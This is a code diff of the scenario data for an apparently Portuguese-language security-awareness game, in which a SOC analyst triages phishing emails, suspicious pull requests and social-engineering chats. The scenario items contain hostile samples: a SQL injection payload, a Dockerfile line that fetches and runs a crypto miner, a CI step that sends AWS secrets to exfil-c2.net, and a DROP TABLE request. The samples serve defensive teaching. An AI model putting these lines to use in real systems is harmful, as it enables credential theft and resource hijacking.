@@ -135,10 +135,12 @@ const CAMPAIGN_SHIFTS = [
         time: '09:15',
         senderName: 'Marcos Silva (RH)',
         senderEmail: 'marcos.rh@techcore-beneficios.com',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=MarcosSilva(RH)',
         avatarChar: 'M',
         avatarColor: '#e91e63',
         subject: '[URGENTE] Atualização Obrigatória de Cadastro de Benefícios',
         snippet: 'Prezado colaborador, identificamos uma pendência no seu cadastro de benefícios corporativos...',
+        attachmentFileName: 'solicitacao_cadastro_beneficios.pdf',
         meta: { 'De': 'Marcos Silva <marcos.rh@techcore-beneficios.com>', 'Para': 'voce@techcore.com', 'Data': '09:12', 'Segurança': 'SPF: NEUTRAL | DKIM: NONE' },
         body: `<p>Prezado colaborador,</p><div class="email-quote-box"><p>Identificamos uma pendência no seu cadastro de benefícios corporativos. Para manter seu plano de saúde ativo, acesse o portal abaixo e confirme seus dados:<br><code>https://portal-colaborador.techcore-beneficios.com/login-sso</code></p></div>`,
         inspector: { type: 'url', label: 'Destino do Link', dest: 'https://portal-colaborador.techcore-beneficios.com/login-sso' },
@@ -153,10 +155,12 @@ const CAMPAIGN_SHIFTS = [
         time: '11:00',
         senderName: 'carlos.dev (TechHub)',
         senderEmail: 'carlos.dev@techcore.com',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=carlos.dev(TechHub)',
         avatarChar: 'C',
         avatarColor: '#2e7d32',
         subject: 'PR #142: Melhoria de performance na consulta de pagamentos PIX',
         snippet: 'Repositório: core-api-v2 | Autor: carlos.dev@techcore.com | Alterações no módulo de consulta',
+        attachmentFileName: 'pix_optimization.diff',
         meta: { 'De': 'carlos.dev (Sênior)', 'Para': '@TechCore-Official / core-api-v2', 'Data': '10:55', 'Segurança': 'GPG Signature: VALID' },
         body: `<p>PR #142 — Repositório: <code>core-api-v2</code></p><div class="email-quote-box"><p><strong>Autor:</strong> carlos.dev@techcore.com<br><strong>Repositório:</strong> core-api-v2<br><strong>Descrição:</strong> Otimização de consulta de banco de dados — alteração na query de pedidos para melhor performance.</p></div>`,
         inspector: { type: 'diff', label: 'Git Diff (core-api-v2/src/pix.ts)', diff: [{ type: 'info', text: '@@ -45,4 +45,4 @@ // Consulta de pedidos PIX' }, { type: 'removed', text: '- const q = db.query("SELECT * FROM orders");' }, { type: 'added', text: '+ const q = db.query("SELECT id, amount, status FROM orders USE INDEX (idx_date)");' }] },
@@ -171,10 +175,12 @@ const CAMPAIGN_SHIFTS = [
         time: '13:30',
         senderName: 'alex.intern (TechAccess)',
         senderEmail: 'alex.intern@techcore.com',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=alex.intern(TechAccess)',
         avatarChar: 'A',
         avatarColor: '#f57c00',
         subject: 'Solicitação de Privilégio: ClusterAdmin Kubernetes (Prod)',
         snippet: 'Solicito permissão administrativa no cluster de produção para resolver um problema de deploy...',
+        attachmentFileName: 'solicitacao_clusteradmin.iam',
         meta: { 'De': 'alex.intern (Estagiário)', 'Para': 'TechAccess Approver', 'Data': '13:28', 'Segurança': 'Chamado: Nenhum informado' },
         body: `<p>Solicitação IAM:</p><div class="email-quote-box"><p>"Solicito acesso administrativo (ClusterAdmin) no Kubernetes de Produção para investigar e resolver um problema no deploy do meu projeto."</p></div>`,
         inspector: { type: 'url', label: 'Matriz de Permissões IAM', dest: 'Solicitante: alex.intern -> Cargo: Estagiário -> Permissão: ClusterAdmin (PROD)' },
@@ -189,10 +195,12 @@ const CAMPAIGN_SHIFTS = [
         time: '15:10',
         senderName: 'RH TechCore (Oficial)',
         senderEmail: 'comunicados@techcore-hr.com',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=RHTechCore(Oficial)',
         avatarChar: 'R',
         avatarColor: '#1976d2',
         subject: 'Informativo: Escala de Férias e Ponto Eletrônico',
         snippet: 'Informamos que o espelho de ponto deste mês já está disponível para consulta...',
+        attachmentFileName: 'escala_ponto_eletronico.pdf',
         meta: { 'De': 'RH TechCore <comunicados@techcore-hr.com>', 'Para': 'todos@techcore.com', 'Data': '15:08', 'Segurança': 'SPF: PASS | DKIM: PASS' },
         body: `<p>Prezada equipe,</p><div class="email-quote-box"><p>O espelho de ponto do mês corrente está disponível para consulta na intranet corporativa. Acesse o portal interno para verificar suas horas e escala de férias.</p></div>`,
         inspector: { type: 'url', label: 'Cabeçalho do Remetente', dest: 'Remetente: comunicados@techcore-hr.com (SPF: PASS | DKIM: PASS)' },
@@ -207,10 +215,12 @@ const CAMPAIGN_SHIFTS = [
         time: '17:20',
         senderName: 'shadow.dev (TechHub)',
         senderEmail: 'shadow.dev@external.net',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=shadow.dev(TechHub)',
         avatarChar: 'S',
         avatarColor: '#616161',
         subject: 'PR #1: Adicionar container de processamento noturno',
         snippet: 'Repositório: crypto-worker-node | Autor: shadow.dev@external.net | Atualização em Dockerfile',
+        attachmentFileName: 'dockerfile_patch.diff',
         meta: { 'De': 'shadow.dev (Conta Externa)', 'Para': 'crypto-worker-node', 'Data': '17:15', 'Segurança': 'Repositório Não Cadastrado' },
         body: `<p>PR #1 — Repositório: <code>crypto-worker-node</code></p><div class="email-quote-box"><p><strong>Autor:</strong> shadow.dev@external.net<br><strong>Repositório:</strong> crypto-worker-node<br><strong>Descrição:</strong> Adição de rotina de segundo plano para otimização de jobs de lote.</p></div>`,
         inspector: { type: 'diff', label: 'Git Diff (crypto-worker-node/Dockerfile)', diff: [{ type: 'info', text: '@@ -1,2 +1,4 @@' }, { type: 'added', text: '+ RUN wget https://mine-pool.org/xmrig.tar.gz' }, { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://mine-pool.org:3333"]' }] },
@@ -293,12 +303,14 @@ const CAMPAIGN_SHIFTS = [
         time: '09:30',
         senderName: 'WAF / TechDB Monitor',
         senderEmail: 'waf-alert@techcore.internal',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=WAF/TechDBMonitor',
         avatarChar: 'W',
         avatarColor: '#d93025',
-        subject: '[ALERTA SQLi] Tentativa de Injeção em Endpoint de Login de Parceiros',
-        snippet: 'Detectada query com UNION SELECT password_hash FROM admin_users no endpoint de autenticação...',
+        subject: 'Alerta WAF: Bloqueio Preventivo no Endpoint de Login',
+        snippet: 'Payload detectado no campo de login de parceiros...',
+        attachmentFileName: 'auth_sqli_payload.sql',
         meta: { 'Origem': 'IP 185.220.101.44 (Tor Exit Node)', 'Endpoint': '/api/v1/auth/partner-login', 'Data': '09:28', 'Status': 'Interceptado no WAF' },
-        body: `<p>Log de Consulta Suspeita interceptada no endpoint de autenticação:</p><div class="email-quote-box"><p>Payload recebido no campo de login:<br><code>' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --</code></p></div>`,
+        body: `<p>Registro do Firewall de Aplicação Web:</p><div class="email-quote-box"><p>Payload recebido no campo de login:<br><code>' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --</code></p></div>`,
         inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT * FROM partners WHERE email = \'\' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --' },
         actions: [
           { id: 'a1', label: '🛡️ Bloquear IP Permanentemente & Sanitizar Query', correct: true, toastMsg: 'Ataque de SQLi bloqueado.', logTitle: 'SQL Injection Neutralizada', consequence: 'IP malicioso banido no Cloudflare e vulnerabilidade de SQLi mitigada.', explanation: 'Identificação correta da tentativa de extração de senhas via UNION SELECT.' },
@@ -311,10 +323,12 @@ const CAMPAIGN_SHIFTS = [
         time: '10:45',
         senderName: 'Suporte de TI Central',
         senderEmail: 'admin@tech-core.com',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuportedeTICentral',
         avatarChar: 'S',
         avatarColor: '#c2185b',
         subject: '[ALERTA DE SEGURANÇA] Falha no Token 2FA - Redefinição Obrigatória',
         snippet: 'Detectamos tentativas não autorizadas. Sincronize seu novo token 2FA no link...',
+        attachmentFileName: 'redefinicao_token_2fa.html',
         meta: { 'De': 'admin@tech-core.com', 'Para': 'voce@techcore.com', 'Data': '10:43', 'Segurança': 'SPF: FAIL' },
         body: `<p>Atenção Colaborador,</p><div class="email-quote-box"><p>Detectamos tentativas de login suspeitas na sua conta corporativa. Clique no link para revalidar seu token de dois fatores:<br><code>https://sso-auth.tech-core.com/sync-mfa</code></p></div>`,
         inspector: { type: 'url', label: 'Inspeção Técnica de Domínio', dest: 'https://sso-auth.tech-core.com/sync-mfa' },
@@ -329,12 +343,14 @@ const CAMPAIGN_SHIFTS = [
         time: '12:15',
         senderName: 'svc_payment_api (TechDB)',
         senderEmail: 'svc-payment@techcore.internal',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=svc_payment_api(TechDB)',
         avatarChar: 'P',
         avatarColor: '#10b981',
-        subject: 'Query Rotineira: Fechamento de Lote de Transações PIX',
+        subject: 'Log TechDB: Execução de Batch em techcore_payments_prod',
         snippet: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL 1 HOUR...',
+        attachmentFileName: 'pix_transactions_summary.sql',
         meta: { 'Usuário': 'svc_payment_api', 'Banco': 'techcore_payments_prod', 'Data': '12:12', 'Assinatura': 'Serviço Interno Autorizado' },
-        body: `<p>Auditoria de Query de Aplicação:</p><div class="email-quote-box"><p>Consulta agendada de agregação financeira de transações concluídas nas últimas horas.</p></div>`,
+        body: `<p>Log do Banco de Dados:</p><div class="email-quote-box"><p>Consulta iniciada no cluster de pagamentos.</p></div>`,
         inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL \'1 hour\' GROUP BY status;' },
         actions: [
           { id: 'a1', label: '✅ Autorizar Execução da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'Operação de Banco Legítima', consequence: 'Fechamento financeiro horário concluído sem interrupção.', explanation: 'Query legítima de agregação executada pela conta autorizada svc_payment_api.' },
@@ -347,10 +363,12 @@ const CAMPAIGN_SHIFTS = [
         time: '14:30',
         senderName: 'carlos-dev-patch-1 (TechHub)',
         senderEmail: 'carlos-dev@external-fork.net',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=carlos-dev-patch-1(TechHub)',
         avatarChar: 'C',
         avatarColor: '#d81b60',
-        subject: 'PR #55: ci: Adicionar notificação no Discord/Slack após deploy',
-        snippet: 'Integração com webhook enviando AWS_SECRET_ACCESS_KEY para endpoint externo...',
+        subject: 'PR #55: ci: Adicionar webhook de notificação',
+        snippet: 'Atualização no workflow de CI/CD para envio de status via HTTP...',
+        attachmentFileName: 'deploy_workflow.patch',
         meta: { 'De': 'carlos-dev-patch-1 (Fork Suspeito)', 'Para': 'deploy-pipeline', 'Data': '14:27', 'Segurança': 'Branch Externa' },
         body: `<p>PR #55 no repositório <code>deploy-pipeline</code>:</p><div class="email-quote-box"><p>Adicionando notificação automática com variáveis de ambiente.</p></div>`,
         inspector: { type: 'diff', label: 'Git Diff (.github/workflows/deploy.yml)', diff: [{ type: 'info', text: '@@ -18,4 +18,6 @@ jobs:' }, { type: 'added', text: '+    - name: Webhook Notify' }, { type: 'added', text: '+      run: curl -s -X POST https://exfil-c2.net/payload -d "SECRET=$AWS_SECRET_ACCESS_KEY"' }] },
@@ -365,10 +383,12 @@ const CAMPAIGN_SHIFTS = [
         time: '08:55',
         senderName: 'Fernanda Lima - DBA',
         senderEmail: 'fernanda.dba@techcore.com',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=FernandaLima-DBA',
         avatarChar: 'F',
         avatarColor: '#7b5ea7',
         subject: 'Janela de Manutenção DB: REINDEX Programado para 09h00',
         snippet: 'Bom dia, realizarei o REINDEX rotineiro no banco de produção agora às 9h...',
+        attachmentFileName: 'db_reindex_maintenance.sql',
         meta: { 'De': 'fernanda.dba@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '08:53', 'Segurança': 'SPF: PASS | DKIM: OK' },
         body: `<p>Bom dia, equipe SOC,</p><div class="email-quote-box"><p>Comunicado de janela de manutenção programada.<br>Usuário: <code>dba_ops_techcore</code> realizará <code>REINDEX DATABASE techcore_main_db;</code> às 09h00 conforme ticket <strong>#DBA-2026-119</strong> aprovado pela gestão.</p></div>`,
         inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: fernanda.dba@techcore.com | SPF: PASS | Ticket: #DBA-2026-119' },
@@ -383,10 +403,12 @@ const CAMPAIGN_SHIFTS = [
         time: '11:20',
         senderName: 'Suporte TechCore — RH',
         senderEmail: 'rh-noreply@techcore-beneficios.com',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuporteTechCore—RH',
         avatarChar: 'R',
         avatarColor: '#c0392b',
         subject: '[AÇÃO REQUERIDA] Atualização de Benefícios — Clique para Confirmar Seus Dados',
         snippet: 'Prezado colaborador, para garantir seu vale-alimentação de setembro confirme seus dados bancários...',
+        attachmentFileName: 'confirmacao_dados_bancarios.html',
         meta: { 'De': 'rh-noreply@techcore-beneficios.com', 'Para': 'todos@techcore.com', 'Data': '11:18', 'Segurança': 'SPF: FAIL | Domínio Externo' },
         body: `<p>Prezado Colaborador,</p><div class="email-quote-box"><p>Para garantir o recebimento do seu <strong>vale-alimentação de setembro</strong>, acesse o portal e confirme seus dados bancários:<br><code>https://portal-rh.techcore-beneficios.com/confirmar-conta</code><br><br>Prazo: <strong>Hoje até 12h00</strong>. Após esse horário os dados não poderão ser alterados.</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Domínio de RH', dest: 'https://portal-rh.techcore-beneficios.com/confirmar-conta' },
@@ -401,10 +423,12 @@ const CAMPAIGN_SHIFTS = [
         time: '13:05',
         senderName: 'Rodrigo Alves — DevOps',
         senderEmail: 'rodrigo.infra@techcore.com',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=RodrigoAlves—DevOps',
         avatarChar: 'V',
         avatarColor: '#1565c0',
         subject: 'Pipeline CI/CD: Solicito Autorização de ANALYZE no Banco de Staging',
         snippet: 'Olá SOC, preciso rodar ANALYZE no banco de staging para otimizar as queries do deploy de sexta...',
+        attachmentFileName: 'staging_analyze.sql',
         meta: { 'De': 'rodrigo.infra@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '13:03', 'Segurança': 'SPF: PASS | DKIM: OK' },
         body: `<p>Olá equipe SOC,</p><div class="email-quote-box"><p>Solicito autorização para rodar <code>ANALYZE techcore_staging_db;</code> via usuário <code>dba_ops_techcore</code> no banco de <strong>staging</strong> (não produção) às 14h, antes do deploy da sexta-feira.<br>Ticket de referência: <strong>#OPS-2026-77</strong>.</p></div>`,
         inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: rodrigo.infra@techcore.com | SPF: PASS | Banco: techcore_staging_db (NÃO produção)' },
@@ -419,10 +443,12 @@ const CAMPAIGN_SHIFTS = [
         time: '15:40',
         senderName: 'Fernanda Lima (DBA)',
         senderEmail: 'fernanda.dba@techcore-ops.net',
+        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=FernandaLima(DBA)',
         avatarChar: 'F',
         avatarColor: '#c0392b',
-        subject: 'URGENTE: DROP TABLE logs_antigos — Preciso de Autorização Agora',
-        snippet: 'Oi, estou em reunião e meu e-mail corporativo caiu. Preciso que você aprove o DROP TABLE urgente...',
+        subject: 'Urgente: Manutenção na tabela de logs (Problema no e-mail)',
+        snippet: 'Estou mandando deste e-mail alternativo pois o corporativo caiu. Aprova a manutenção na tabela de logs.',
+        attachmentFileName: 'drop_table_logs.sql',
         meta: { 'De': 'fernanda.dba@techcore-ops.net', 'Para': 'soc-team@techcore.com', 'Data': '15:38', 'Segurança': 'SPF: FAIL | Domínio Externo' },
         body: `<p>Oi time SOC,</p><div class="email-quote-box"><p>Estou em reunião urgente com o cliente e meu e-mail <code>@techcore.com</code> caiu. Estou mandando desse e-mail alternativo.<br>Preciso que você execute agora: <code>DROP TABLE logs_antigos CASCADE;</code> no banco de produção. Ticket vou mandar depois, é urgente!</p></div>`,
         inspector: { type: 'url', label: 'Verificação de Domínio do Remetente', dest: 'De: fernanda.dba@techcore-ops.net | SPF: FAIL | Domínio: techcore-ops.net (EXTERNO)' },
@@ -486,6 +512,7 @@ const CAMPAIGN_SHIFTS = [
         time: '09:40',
         senderName: 'carlos.dev',
         senderEmail: '+55 11 98765-4321',
+        avatarImg: 'whats_avatar.png',
         avatarChar: 'C',
         avatarColor: '#2e7d32',
         subject: 'carlos.dev: "Preciso de reset do meu 2FA urgente!"',
@@ -494,7 +521,7 @@ const CAMPAIGN_SHIFTS = [
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
     <span class="wz-topbar-back">←</span>
-    <div class="wz-topbar-avatar" style="background:#2e7d32;">C</div>
+    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
     <div class="wz-topbar-info">
       <div class="wz-topbar-name">carlos.dev</div>
       <div class="wz-topbar-status">+55 11 98765-4321 · online</div>
@@ -504,10 +531,20 @@ const CAMPAIGN_SHIFTS = [
   <div class="wz-chat-bg">
     <div class="wz-date-label">HOJE</div>
     <div class="wz-msg-row incoming">
-      <div class="wz-msg-avatar" style="background:#2e7d32;">C</div>
+      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender">carlos.dev</div>
         Fala meu bom! Cara, comprei um celular novo no shopping e perdi o aplicativo de 2FA do autenticador. Desativa o 2FA da minha conta aí rapidão que preciso subir um deploy agora em 5 minutos! 🙏
+        
+        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
+          <div class="wz-doc-icon-box">📄</div>
+          <div class="wz-doc-info">
+            <div class="wz-doc-title">solicitacao_reset_2fa.pdf</div>
+            <div class="wz-doc-meta">245 KB · DOCUMENTO ENVIADO</div>
+          </div>
+          <div class="wz-doc-dl-icon">⬇</div>
+        </div>
+        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
         <div class="wz-bubble-footer"><span class="wz-bubble-time">09:38</span></div>
       </div>
     </div>
@@ -519,7 +556,7 @@ const CAMPAIGN_SHIFTS = [
       </div>
     </div>
     <div class="wz-msg-row incoming">
-      <div class="wz-msg-avatar" style="background:#2e7d32;">C</div>
+      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         Ah pô, crachá é #DEV-999 e o projeto é crypto-worker! Libera logo mano, tô com pressa! 😤
         <div class="wz-bubble-footer"><span class="wz-bubble-time">09:40</span></div>
@@ -544,6 +581,7 @@ const CAMPAIGN_SHIFTS = [
         time: '11:50',
         senderName: 'beatriz.sec',
         senderEmail: '+55 11 97654-3210',
+        avatarImg: 'whats_avatar.png',
         avatarChar: 'B',
         avatarColor: '#00897b',
         subject: 'beatriz.sec: "Confirmação de token para investigação forense"',
@@ -552,7 +590,7 @@ const CAMPAIGN_SHIFTS = [
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
     <span class="wz-topbar-back">←</span>
-    <div class="wz-topbar-avatar" style="background:#00897b;">B</div>
+    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
     <div class="wz-topbar-info">
       <div class="wz-topbar-name">beatriz.sec</div>
       <div class="wz-topbar-status">+55 11 97654-3210 · online</div>
@@ -562,10 +600,20 @@ const CAMPAIGN_SHIFTS = [
   <div class="wz-chat-bg">
     <div class="wz-date-label">HOJE</div>
     <div class="wz-msg-row incoming">
-      <div class="wz-msg-avatar" style="background:#00897b;">B</div>
+      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender">beatriz.sec</div>
         Olá Analista, sou a Beatriz de SecOps. Estou investigando a tentativa de brute force na API. Meu crachá é <strong>#SEC-8921</strong> e meu projeto é <strong>auth-service</strong>. Pode validar meu token temporário de auditoria?
+        
+        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
+          <div class="wz-doc-icon-box">📄</div>
+          <div class="wz-doc-info">
+            <div class="wz-doc-title">token_auditoria_forense.sig</div>
+            <div class="wz-doc-meta">128 KB · DOCUMENTO ENVIADO</div>
+          </div>
+          <div class="wz-doc-dl-icon">⬇</div>
+        </div>
+        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
         <div class="wz-bubble-footer"><span class="wz-bubble-time">11:48</span></div>
       </div>
     </div>
@@ -577,7 +625,7 @@ const CAMPAIGN_SHIFTS = [
       </div>
     </div>
     <div class="wz-msg-row incoming">
-      <div class="wz-msg-avatar" style="background:#00897b;">B</div>
+      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         Confirmado! Código 482-910 validado no meu app autenticador ✅
         <div class="wz-bubble-footer"><span class="wz-bubble-time">11:50</span></div>
@@ -602,6 +650,7 @@ const CAMPAIGN_SHIFTS = [
         time: '14:20',
         senderName: 'marcos.rh',
         senderEmail: '+55 11 96543-2109',
+        avatarImg: 'whats_avatar.png',
         avatarChar: 'M',
         avatarColor: '#e91e63',
         subject: 'marcos.rh: "Me manda a chave privada SSL da empresa!"',
@@ -610,7 +659,7 @@ const CAMPAIGN_SHIFTS = [
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
     <span class="wz-topbar-back">←</span>
-    <div class="wz-topbar-avatar" style="background:#e91e63;">M</div>
+    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
     <div class="wz-topbar-info">
       <div class="wz-topbar-name">marcos.rh</div>
       <div class="wz-topbar-status">+55 11 96543-2109 · online</div>
@@ -620,10 +669,20 @@ const CAMPAIGN_SHIFTS = [
   <div class="wz-chat-bg">
     <div class="wz-date-label">HOJE</div>
     <div class="wz-msg-row incoming">
-      <div class="wz-msg-avatar" style="background:#e91e63;">M</div>
+      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender">marcos.rh</div>
         Oi colega da TI! Estou numa reunião com auditores do Ministério do Trabalho e eles exigiram que você envie o arquivo <strong>private_key.pem</strong> do certificado SSL da empresa por aqui AGORA! É urgente! 😰
+        
+        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
+          <div class="wz-doc-icon-box">📄</div>
+          <div class="wz-doc-info">
+            <div class="wz-doc-title">requisicao_private_key_ssl.pem</div>
+            <div class="wz-doc-meta">512 KB · DOCUMENTO ENVIADO</div>
+          </div>
+          <div class="wz-doc-dl-icon">⬇</div>
+        </div>
+        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
         <div class="wz-bubble-footer"><span class="wz-bubble-time">14:18</span></div>
       </div>
     </div>
@@ -635,7 +694,7 @@ const CAMPAIGN_SHIFTS = [
       </div>
     </div>
     <div class="wz-msg-row incoming">
-      <div class="wz-msg-avatar" style="background:#e91e63;">M</div>
+      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         Não interessa o crachá! Sou gerente aqui! Se você não mandar esse arquivo vou te advertir por insubordinação! 😡
         <div class="wz-bubble-footer"><span class="wz-bubble-time">14:20</span></div>
@@ -660,6 +719,7 @@ const CAMPAIGN_SHIFTS = [
         time: '16:05',
         senderName: 'alex.intern',
         senderEmail: '+55 11 95432-1098',
+        avatarImg: 'whats_avatar.png',
         avatarChar: 'A',
         avatarColor: '#f57c00',
         subject: 'alex.intern: "Erro de certificado no staging, ajuda?"',
@@ -668,7 +728,7 @@ const CAMPAIGN_SHIFTS = [
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
     <span class="wz-topbar-back">←</span>
-    <div class="wz-topbar-avatar" style="background:#f57c00;">A</div>
+    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
     <div class="wz-topbar-info">
       <div class="wz-topbar-name">alex.intern</div>
       <div class="wz-topbar-status">+55 11 95432-1098 · online</div>
@@ -678,10 +738,20 @@ const CAMPAIGN_SHIFTS = [
   <div class="wz-chat-bg">
     <div class="wz-date-label">HOJE</div>
     <div class="wz-msg-row incoming">
-      <div class="wz-msg-avatar" style="background:#f57c00;">A</div>
+      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender">alex.intern</div>
         Oi time de TI! Estou tentando rodar os testes do front-end no ambiente de staging e dá erro de certificado (403 Forbidden). Segue o chamado registrado no portal: <strong>#STG-331</strong> e meu crachá: <strong>#INT-007</strong>. Podem me orientar? 🙏
+        
+        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
+          <div class="wz-doc-icon-box">📄</div>
+          <div class="wz-doc-info">
+            <div class="wz-doc-title">chamado_stg_331_certificado.pdf</div>
+            <div class="wz-doc-meta">310 KB · DOCUMENTO ENVIADO</div>
+          </div>
+          <div class="wz-doc-dl-icon">⬇</div>
+        </div>
+        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
         <div class="wz-bubble-footer"><span class="wz-bubble-time">16:02</span></div>
       </div>
     </div>
@@ -704,15 +774,16 @@ const CAMPAIGN_SHIFTS = [
         time: '17:30',
         senderName: 'Número Desconhecido',
         senderEmail: '+1 (555) 019-2831',
-        avatarChar: '?',
-        avatarColor: '#424242',
-        subject: 'Número desconhecido: "Sou o Rogério CEO — libere acesso SSH urgente"',
-        snippet: 'Aqui é o Rogério de outro celular em viagem internacional. Libere o IP 198.51.100.22...',
+        avatarImg: 'whats_avatar.png',
+        avatarChar: '',
+        avatarColor: 'transparent',
+        subject: 'Número desconhecido: "Rogério CEO enviou um arquivo"',
+        snippet: 'Aqui é o Rogério CEO... mandei o arquivo por aqui mesmo. Extraia e mande...',
         meta: { 'Número': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'Número VOIP Desconhecido — NÃO registrado na TechCore' },
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
     <span class="wz-topbar-back">←</span>
-    <div class="wz-topbar-avatar" style="background:#424242;">?</div>
+    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
     <div class="wz-topbar-info">
       <div class="wz-topbar-name">+1 (555) 019-2831</div>
       <div class="wz-topbar-status">Número não salvo · online</div>
@@ -722,10 +793,20 @@ const CAMPAIGN_SHIFTS = [
   <div class="wz-chat-bg">
     <div class="wz-date-label">HOJE</div>
     <div class="wz-msg-row incoming">
-      <div class="wz-msg-avatar" style="background:#424242;">?</div>
+      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="whats_avatar.png" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender" style="color:#e53935;">⚠️ Número Desconhecido</div>
         Aqui é o Rogério CEO. Estou em Nova York fechando um contrato de aquisição. Preciso que você libere <strong>agora</strong> o IP 198.51.100.22 no firewall SSH. <strong>Não fale com ninguém sobre isso.</strong>
+        
+        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir auditoria da sessão">
+          <div class="wz-doc-icon-box">📄</div>
+          <div class="wz-doc-info">
+            <div class="wz-doc-title">liberacao_porta_22_ssh.conf</div>
+            <div class="wz-doc-meta">85 KB · DOCUMENTO ENVIADO</div>
+          </div>
+          <div class="wz-doc-dl-icon">⬇</div>
+        </div>
+        <div class="wz-doc-hint-text">🔍 Clique no documento para abrir a auditoria de sessão</div>
         <div class="wz-bubble-footer"><span class="wz-bubble-time">17:28</span></div>
       </div>
     </div>
@@ -800,10 +881,12 @@ const CAMPAIGN_SHIFTS = [
         time: '09:15',
         senderName: 'CEO Rogério Silva (Oficial)',
         senderEmail: 'rogerio.ceo@techcore.com',
+        avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
         subject: '[ORDEM DIRETA] Despachar Arquivo Honeytoken: honeytoken_trap_v4.vault',
         snippet: 'Despache a armadilha com tokens falsos para o dropzone oficial da perícia...',
+        attachmentFileName: 'honeytoken_trap_v4.vault',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'dropzone-trap@techcore-vault.internal', 'Data': '09:12', 'Prioridade': 'MÁXIMA (CEO)' },
